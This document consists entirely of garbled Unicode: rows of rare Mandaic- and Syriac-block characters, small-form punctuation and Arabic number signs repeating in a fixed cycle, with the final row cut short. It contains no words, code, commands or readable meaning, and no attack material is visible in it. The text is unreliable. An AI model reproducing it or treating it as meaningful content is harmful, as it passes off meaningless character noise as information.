࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬